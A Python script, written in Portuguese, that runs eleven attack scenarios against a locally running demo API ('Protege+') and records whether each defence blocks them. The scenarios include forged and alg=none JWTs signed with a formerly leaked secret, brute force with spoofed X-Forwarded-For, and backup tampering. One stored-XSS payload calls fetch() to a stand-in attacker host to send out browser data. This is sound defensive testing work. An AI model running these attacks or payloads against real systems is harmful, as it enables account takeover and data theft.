#!/usr/bin/env python3
"""
Protege+ | Fase 7 | Simulacao de ataques contra a API em execucao.

Parte 1.3 da Atividade Visao de Futuro: "simular um cenario de ataque e
descrever como o sistema responderia e se manteria resiliente". Este roteiro
nao descreve: ele ATACA a API de verdade e registra a resposta de cada
defesa, com o codigo HTTP e a evidencia.

Uso (com a API no ar, em outro terminal: backend\\build.cmd run):
    py seguranca\\simular_ataques.py
    py seguranca\\simular_ataques.py --api http://localhost:8080/api --dados backend\\data

So usa a biblioteca padrao do Python 3.8+. Rode contra a SUA instancia de
demonstracao: o roteiro cria denuncias de teste, gera um backup e altera de
proposito uma copia dele para provar que a adulteracao e detectada.

Cada cenario termina em BLOQUEADO (a defesa funcionou), FALHOU (a defesa
nao reagiu como esperado) ou INFO (observacao). O relatorio completo vai
para seguranca/resultados/ em JSON e em Markdown.
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import random
import string
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime
from pathlib import Path

# Sem proxy: a API e local. Um proxy corporativo configurado no Windows
# interceptaria localhost e mascararia o resultado.
_ABRIDOR = urllib.request.build_opener(urllib.request.ProxyHandler({}))

CONTAS = {
    "ADMIN": ("admin@protege.gov.br", "admin123"),
    "GESTOR": ("gestor@protege.gov.br", "gestor123"),
    "ATENDENTE": ("atendente@protege.gov.br", "atendente123"),
    "AUDITOR": ("auditor@protege.gov.br", "auditor123"),
}

# Segredo que ficava escrito no application.properties ate a Fase 6. Quem lia
# o repositorio publico podia assinar um token de ADMIN com ele.
SEGREDO_ANTIGO_FASE6 = "protege-gov-hackgov-fiap-egesp-chave-secreta-2026"


class Resposta:
    def __init__(self, status, corpo, cabecalhos):
        self.status = status
        self.corpo = corpo
        self.cabecalhos = cabecalhos

    def json(self):
        try:
            return json.loads(self.corpo.decode("utf-8"))
        except Exception:
            return None

    def texto(self, limite=180):
        t = self.corpo.decode("utf-8", errors="replace").replace("\n", " ")
        return t[:limite]


def chamar(metodo, url, corpo=None, token=None, cabecalhos=None, tipo="application/json"):
    dados = None
    h = {"Accept": "application/json"}
    if cabecalhos:
        h.update(cabecalhos)
    if corpo is not None:
        if isinstance(corpo, (bytes, bytearray)):
            dados = bytes(corpo)
        else:
            dados = json.dumps(corpo).encode("utf-8")
        h["Content-Type"] = tipo
    if token:
        h["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, data=dados, method=metodo, headers=h)
    try:
        with _ABRIDOR.open(req, timeout=20) as r:
            return Resposta(r.status, r.read(), dict(r.headers))
    except urllib.error.HTTPError as e:
        return Resposta(e.code, e.read(), dict(e.headers or {}))


def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def token_forjado(segredo, email="admin@protege.gov.br", perfil="ADMIN", alg="HS256"):
    agora = int(time.time())
    cab = {"alg": alg, "typ": "JWT"}
    carga = {"sub": email, "nome": "Invasor", "role": perfil, "iat": agora, "exp": agora + 3600}
    a = b64url(json.dumps(cab, separators=(",", ":")).encode())
    b = b64url(json.dumps(carga, separators=(",", ":")).encode())
    if alg == "none":
        return a + "." + b + "."
    assinatura = hmac.new(segredo.encode(), (a + "." + b).encode(), hashlib.sha256).digest()
    return a + "." + b + "." + b64url(assinatura)


def multipart(campo, nome_arquivo, conteudo, tipo="image/jpeg"):
    fronteira = "----protege" + "".join(random.choices(string.ascii_letters, k=16))
    partes = [
        ("--" + fronteira).encode(),
        ('Content-Disposition: form-data; name="%s"; filename="%s"' % (campo, nome_arquivo)).encode(),
        ("Content-Type: " + tipo).encode(),
        b"",
        conteudo,
        ("--" + fronteira + "--").encode(),
        b"",
    ]
    return b"\r\n".join(partes), "multipart/form-data; boundary=" + fronteira


class Simulacao:
    def __init__(self, api, dados):
        self.api = api.rstrip("/")
        self.dados = Path(dados)
        self.resultados = []
        self.tokens = {}

    # ------------------------------------------------------------------
    def registrar(self, cenario, ataque, esperado, obtido, ok, evidencia, defesa, pilar):
        situacao = "BLOQUEADO" if ok is True else ("INFO" if ok is None else "FALHOU")
        self.resultados.append({
            "cenario": cenario, "ataque": ataque, "esperado": esperado, "obtido": obtido,
            "situacao": situacao, "evidencia": evidencia, "defesa": defesa, "pilarCIA": pilar,
        })
        cor = {"BLOQUEADO": "\033[32m", "FALHOU": "\033[31m", "INFO": "\033[36m"}[situacao]
        print("%s[%s]\033[0m %s | esperado %s | obtido %s" % (cor, situacao, cenario, esperado, obtido))

    def url(self, caminho):
        return self.api + caminho

    # ------------------------------------------------------------------
    def preparar(self):
        r = chamar("GET", self.url("/vigia/status"))
        if r.status != 200:
            print("A API nao respondeu em %s (status %s). Suba com: backend\\build.cmd run" % (self.api, r.status))
            sys.exit(2)
        st = r.json() or {}
        if not st.get("demo"):
            print("A API nao esta em modo demonstracao. Este roteiro usa as contas de demonstracao.")
            sys.exit(2)
        for perfil, (email, senha) in CONTAS.items():
            r = chamar("POST", self.url("/auth/login"), {"email": email, "senha": senha})
            if r.status != 200:
                print("Login de %s falhou (%s). Rode o roteiro com a API recem-iniciada." % (perfil, r.status))
                sys.exit(2)
            self.tokens[perfil] = r.json()["token"]
        print("Tokens obtidos para os 4 perfis.\n")

    # ------------------------------------------------------------------
    def c01_token_forjado(self):
        alvo = self.url("/auditoria?pagina=0&tamanho=1")
        r1 = chamar("GET", alvo, token=token_forjado(SEGREDO_ANTIGO_FASE6))
        r2 = chamar("GET", alvo, token=token_forjado("", alg="none"))
        r3 = chamar("GET", alvo, token=self.tokens["ADMIN"][:-4] + "AAAA")
        obtidos = [r1.status, r2.status, r3.status]
        self.registrar(
            "C01 Token de ADMIN forjado",
            "Assinar um token de ADMIN com o segredo que era publico ate a Fase 6, "
            "um token sem assinatura (alg=none) e um token real com a assinatura alterada",
            "401, 401, 401", ", ".join(map(str, obtidos)), obtidos == [401, 401, 401],
            "Respostas: " + " | ".join(r.texto(90) for r in (r1, r2, r3)),
            "GuardiaoDeSegredos sorteia o segredo do JWT a cada execucao; jjwt recusa alg=none e assinatura invalida",
            "Confidencialidade e Integridade")

    def c02_escalada_de_privilegio(self):
        casos = [
            ("ATENDENTE", "GET", "/auditoria?pagina=0&tamanho=1", None),
            ("ATENDENTE", "DELETE", "/denuncias/1?motivo=teste", None),
            ("ATENDENTE", "PATCH", "/denuncias/1/responsavel", {"responsavelId": 1}),
            ("AUDITOR", "GET", "/denuncias/1", None),
            ("AUDITOR", "GET", "/evidencias/1/arquivo", None),
            ("GESTOR", "POST", "/backup", None),
        ]
        obtidos = []
        for perfil, metodo, caminho, corpo in casos:
            r = chamar(metodo, self.url(caminho), corpo, token=self.tokens[perfil])
            obtidos.append("%s %s %s -> %s" % (perfil, metodo, caminho.split("?")[0], r.status))
        ok = all(o.endswith("-> 403") for o in obtidos)
        self.registrar(
            "C02 Escalada de privilegio entre perfis",
            "Usar um login valido de perfil baixo para acessar o que e de outro perfil",
            "403 em todos", "; ".join(o.split(" -> ")[1] for o in obtidos), ok,
            "; ".join(obtidos),
            "Matriz de perfis por rota no SecurityConfig; o perfil vem do banco a cada requisicao",
            "Confidencialidade")

    def c03_forca_bruta_login(self):
        statuses = []
        for i in range(25):
            # IP falso diferente a cada tentativa: a Fase 6 confiava nesse
            # cabecalho e o atacante escapava do limite trocando o valor.
            ip_falso = "203.0.113.%d" % (i + 1)
            r = chamar("POST", self.url("/auth/login"),
                       {"email": "admin@protege.gov.br", "senha": "chute%03d" % i},
                       cabecalhos={"X-Forwarded-For": ip_falso})
            statuses.append(r.status)
        bloqueios = statuses.count(429)
        self.registrar(
            "C03 Forca bruta na senha com IP falsificado",
            "25 senhas erradas em sequencia, cada uma com um X-Forwarded-For diferente",
            "401 ate o limite, depois 429", "%d x 401, %d x 429" % (statuses.count(401), bloqueios),
            bloqueios > 0 and 200 not in statuses,
            "Sequencia: " + " ".join(map(str, statuses)),
            "RateLimitFilter usa o IP real da conexao (20 logins/min); senha em BCrypt; tentativa registrada como LOGIN_NEGADO",
            "Confidencialidade e Disponibilidade")

    def c04_adivinhar_protocolo(self):
        alfabeto = "23456789ABCDEFGHJKMNPQRSTUVWXYZ"
        statuses = []
        for _ in range(40):
            p = "2026-" + "-".join("".join(random.choices(alfabeto, k=4)) for _ in range(3))
            statuses.append(chamar("GET", self.url("/denuncias/protocolo/" + p)).status)
        self.registrar(
            "C04 Adivinhar protocolo de outra pessoa",
            "40 protocolos sorteados no formato valido, tentando achar o caso de uma vitima",
            "404 e, passado o limite, 429", "%d x 404, %d x 429, %d x 200" % (
                statuses.count(404), statuses.count(429), statuses.count(200)),
            statuses.count(429) > 0 and statuses.count(200) == 0,
            "Espaco de protocolos: 31^12 (cerca de 7,9 x 10^17). A 30 tentativas/min por origem, "
            "varrer 1%% do espaco levaria mais de 500 milhoes de anos.",
            "Protocolo com SecureRandom (59 bits) e limite de consultas por origem",
            "Confidencialidade")

    def c05_xss_armazenado(self):
        carga = '<img src=x onerror="fetch(\'https://atacante.exemplo/?t=\'+localStorage.length)">'
        r = chamar("POST", self.url("/denuncias"), {
            "tipo": "assedio", "descricao": "Teste de seguranca: " + carga,
            "estado": "SP", "cidade": "Osasco<script>alert(1)</script>", "anonimo": True})
        if r.status != 201:
            self.registrar("C05 Script malicioso dentro da denuncia", "Enviar HTML com script no relato e na cidade",
                           "201 e texto inerte", str(r.status), None, r.texto(), "-", "Integridade")
            return
        protocolo = (r.json() or {}).get("protocolo", "")
        publico = chamar("GET", self.url("/denuncias/protocolo/" + protocolo.replace("#", "")))
        vazou_relato = "onerror" in publico.texto(5000)
        self.registrar(
            "C05 Script malicioso dentro da denuncia anonima",
            "Denuncia anonima com <img onerror> no relato e <script> na cidade, para rodar no painel do gestor",
            "Aceita como texto; consulta publica sem o relato; painel exibe escapado",
            "%s; consulta publica %s o relato" % (r.status, "EXPOE" if vazou_relato else "nao expoe"),
            not vazou_relato,
            "Protocolo %s. A API guarda o texto como texto; quem neutraliza e o front-end, que escapa "
            "todo dado antes de exibir (escHtml/jsArg, testado no navegador: 0 execucoes em 44 pontos)." % protocolo,
            "Escape de saida em todo o front-end; DTO publico sem relato nem endereco",
            "Integridade e Confidencialidade")
        self.protocolo_teste = protocolo

    def c06_inundacao_de_denuncias(self):
        statuses = []
        for i in range(8):
            r = chamar("POST", self.url("/denuncias"), {
                "tipo": "outros", "descricao": "Denuncia falsa em massa numero %d para lotar a fila" % i,
                "estado": "SP", "cidade": "Barueri", "anonimo": True})
            statuses.append(r.status)
        self.registrar(
            "C06 Inundacao do canal com denuncias falsas",
            "8 denuncias seguidas da mesma origem para enterrar os casos reais na fila",
            "201 ate o limite, depois 429", " ".join(map(str, statuses)),
            429 in statuses,
            "Limite de 5 denuncias por minuto por origem (o C05 ja usou 1).",
            "RateLimitFilter na rota publica de registro",
            "Disponibilidade")

    def c07_upload_malicioso(self):
        proto = getattr(self, "protocolo_teste", "").replace("#", "")
        if not proto:
            self.registrar("C07 Upload malicioso", "-", "-", "sem protocolo do C05", None, "-", "-", "Integridade")
            return
        caminho = self.url("/denuncias/protocolo/%s/evidencias" % proto)
        exe = b"MZ\x90\x00" + os.urandom(2000)
        corpo1, tipo1 = multipart("arquivo", "foto_da_agressao.jpg", exe, "image/jpeg")
        r1 = chamar("POST", caminho, corpo1, tipo=tipo1)
        grande = b"\xff\xd8\xff\xe0" + os.urandom(7 * 1024 * 1024)
        corpo2, tipo2 = multipart("arquivo", "video.jpg", grande, "image/jpeg")
        r2 = chamar("POST", caminho, corpo2, tipo=tipo2)
        ok = r1.status in (400, 415, 422) and r2.status in (400, 413)
        self.registrar(
            "C07 Upload de executavel disfarcado e de arquivo gigante",
            "Programa do Windows (MZ) renomeado para .jpg, e um arquivo de 7 MB",
            "Recusa dos dois (415 e 413)", "%s e %s" % (r1.status, r2.status), ok,
            "Executavel: %s | Gigante: %s" % (r1.texto(110), r2.texto(110)),
            "Tipo conferido pelos bytes iniciais (nao pela extensao); limite de 5 MB; nome gerado no servidor",
            "Integridade e Disponibilidade")

    def c08_corpo_gigante(self):
        corpo = {"tipo": "outros", "descricao": "x" * (400 * 1024)}
        r = chamar("PUT", self.url("/denuncias/1"), corpo)
        self.registrar(
            "C08 Corpo JSON gigante para esgotar memoria",
            "PUT com 400 KB de texto, sem nem estar autenticado",
            "413 antes de ler o corpo", str(r.status), r.status == 413,
            r.texto(),
            "LimiteCorpoFilter (256 KB) roda antes da autenticacao e do parser JSON",
            "Disponibilidade")

    def c09_dispositivo_falso(self):
        corpo = {"tornozeleira": "TZ-0001", "lat": -23.53, "lng": -46.79, "bateria": 80}
        r1 = chamar("POST", self.url("/iot/telemetria"), corpo)
        r2 = chamar("POST", self.url("/iot/telemetria"), corpo, cabecalhos={"X-Device-Key": "protege-iot-2026"})
        chave_arq = self.dados / "iot-chave.txt"
        r3 = None
        if chave_arq.exists():
            chave = chave_arq.read_text(encoding="utf-8").strip()
            r3 = chamar("POST", self.url("/iot/telemetria"), corpo, cabecalhos={"X-Device-Key": chave})
        vazou = r3 is not None and any(k in r3.texto(2000) for k in ("dentro", "distancia", "raio", "alerta"))
        ok = r1.status == 401 and r2.status == 401 and (r3 is None or (r3.status in (200, 202) and not vazou))
        self.registrar(
            "C09 Aparelho IoT falso e oraculo de localizacao",
            "Telemetria sem chave, com a chave antiga publicada na Fase 6, e com a chave certa "
            "tentando descobrir se a coordenada cai no perimetro da vitima",
            "401, 401 e resposta sem informacao de perimetro",
            "%s, %s, %s" % (r1.status, r2.status, r3.status if r3 else "sem chave local"),
            ok,
            "Resposta com a chave certa: %s" % (r3.texto(120) if r3 else "-"),
            "ChaveDispositivoFilter confere a chave antes do corpo; chave sorteada por execucao; "
            "resposta so diz ACEITA ou DESCARTADA",
            "Confidencialidade e Integridade")

    def c10_backup_e_adulteracao(self):
        adm, aud = self.tokens["ADMIN"], self.tokens["AUDITOR"]
        r1 = chamar("POST", self.url("/backup"), token=adm)
        if r1.status == 409:
            self.registrar("C10 Backup", "-", "201", "409 (backup recente)", None,
                           r1.texto(), "Intervalo minimo de 10 min entre backups manuais", "Disponibilidade")
            return
        info = r1.json() or {}
        r2 = chamar("POST", self.url("/backup"), token=adm)
        arquivo = self.dados / "backups" / info.get("arquivo", "inexistente")
        if arquivo.exists():
            # O ataque realista troca o conteudo do proprio arquivo. O original
            # fica guardado em memoria e volta ao fim, como numa restauracao.
            original = arquivo.read_bytes()
            arquivo.write_bytes(original + b"ransomware-esteve-aqui")
            lista = chamar("GET", self.url("/backup"), token=aud).json() or {}
            situacao = next((b["situacao"] for b in lista.get("backups", []) if b["arquivo"] == arquivo.name), "?")
            arquivo.write_bytes(original)
            depois = chamar("GET", self.url("/backup"), token=aud).json() or {}
            situacao_depois = next((b["situacao"] for b in depois.get("backups", []) if b["arquivo"] == arquivo.name), "?")
        else:
            situacao, situacao_depois = "pasta de dados nao encontrada", "-"
        ok = r1.status == 201 and r2.status == 409 and situacao == "ALTERADO" and situacao_depois == "integro"
        self.registrar(
            "C10 Ransomware altera o backup",
            "Gerar backup, tentar gerar outro em seguida (para girar o historico) e alterar o arquivo do backup",
            "201, 409, ALTERADO, e integro de novo apos restaurar o original",
            "%s, %s, %s, %s" % (r1.status, r2.status, situacao, situacao_depois), ok,
            "Backup %s com SHA-256 %s... registrado na trilha e no manifesto" % (
                info.get("arquivo"), str(info.get("sha256", ""))[:16]),
            "BackupService: SHA-256 do arquivo gravado na trilha encadeada e em manifesto.sha256; "
            "restaurar-backup.ps1 recusa arquivo ALTERADO",
            "Integridade e Disponibilidade")

    def c11_trilha_registrou(self):
        r = chamar("GET", self.url("/auditoria?pagina=0&tamanho=200"), token=self.tokens["AUDITOR"])
        corpo = r.json() or {}
        itens = corpo.get("conteudo") or corpo.get("content") or []
        negados = [i for i in itens if (i.get("resultado") == "NEGADO")]
        logins_negados = [i for i in itens if i.get("acao") == "LOGIN_NEGADO"]
        integ = chamar("GET", self.url("/auditoria/integridade"), token=self.tokens["AUDITOR"]).json() or {}
        ok = r.status == 200 and len(negados) > 0 and integ.get("integra") is True
        self.registrar(
            "C11 Os ataques deixaram rastro?",
            "Auditor consulta a trilha depois de todos os ataques",
            "Recusas registradas e cadeia intacta",
            "%d recusas (%d logins negados); cadeia %s" % (
                len(negados), len(logins_negados), "intacta" if integ.get("integra") else "ROMPIDA"),
            ok,
            "Integridade: %s" % integ.get("motivo"),
            "AuditoriaService com corrente de hash SHA-256; RespostasDeSeguranca registra cada 403",
            "Integridade")

    # ------------------------------------------------------------------
    def executar(self):
        inicio = datetime.now()
        print("Protege+ | Simulacao de ataques | %s | API %s\n" % (inicio.strftime("%d/%m/%Y %H:%M:%S"), self.api))
        self.preparar()
        for passo in (self.c01_token_forjado, self.c02_escalada_de_privilegio, self.c05_xss_armazenado,
                      self.c06_inundacao_de_denuncias, self.c07_upload_malicioso, self.c08_corpo_gigante,
                      self.c04_adivinhar_protocolo, self.c09_dispositivo_falso, self.c10_backup_e_adulteracao,
                      self.c03_forca_bruta_login, self.c11_trilha_registrou):
            try:
                passo()
            except Exception as e:  # um cenario quebrado nao derruba os outros
                self.registrar(passo.__name__, "-", "-", "erro no roteiro: %s" % e, False, "-", "-", "-")
        self.salvar(inicio)

    def salvar(self, inicio):
        pasta = Path(__file__).resolve().parent / "resultados"
        pasta.mkdir(exist_ok=True)
        carimbo = inicio.strftime("%Y%m%d-%H%M%S")
        bloqueados = sum(1 for r in self.resultados if r["situacao"] == "BLOQUEADO")
        falhas = sum(1 for r in self.resultados if r["situacao"] == "FALHOU")
        resumo = {"executadoEm": inicio.isoformat(timespec="seconds"), "api": self.api,
                  "bloqueados": bloqueados, "falhas": falhas, "cenarios": self.resultados}
        (pasta / ("simulacao-%s.json" % carimbo)).write_text(
            json.dumps(resumo, ensure_ascii=False, indent=2), encoding="utf-8")
        linhas = ["# Simulacao de ataques | %s" % inicio.strftime("%d/%m/%Y %H:%M"), "",
                  "API: `%s` | **%d bloqueados, %d falhas**" % (self.api, bloqueados, falhas), "",
                  "| Cenario | Esperado | Obtido | Situacao | Pilar CIA |", "|---|---|---|---|---|"]
        for r in self.resultados:
            linhas.append("| %s | %s | %s | %s | %s |" % (
                r["cenario"], r["esperado"], r["obtido"], r["situacao"], r["pilarCIA"]))
        linhas += ["", "## Detalhe", ""]
        for r in self.resultados:
            linhas += ["### %s" % r["cenario"], "", "- **Ataque:** %s" % r["ataque"],
                       "- **Defesa:** %s" % r["defesa"], "- **Evidencia:** %s" % r["evidencia"], ""]
        (pasta / ("simulacao-%s.md" % carimbo)).write_text("\n".join(linhas), encoding="utf-8")
        print("\n%d bloqueados, %d falhas. Relatorio em %s" % (bloqueados, falhas, pasta))
        sys.exit(1 if falhas else 0)


if __name__ == "__main__":
    if os.name == "nt":
        os.system("")  # liga as cores ANSI no console do Windows
    p = argparse.ArgumentParser(description="Simula ataques contra a API do Protege+ em execucao.")
    p.add_argument("--api", default="http://localhost:8080/api")
    p.add_argument("--dados", default=str(Path(__file__).resolve().parent.parent / "backend" / "data"),
                   help="pasta de dados da API (chave IoT e backups)")
    a = p.parse_args()
    Simulacao(a.api, a.dados).executar()
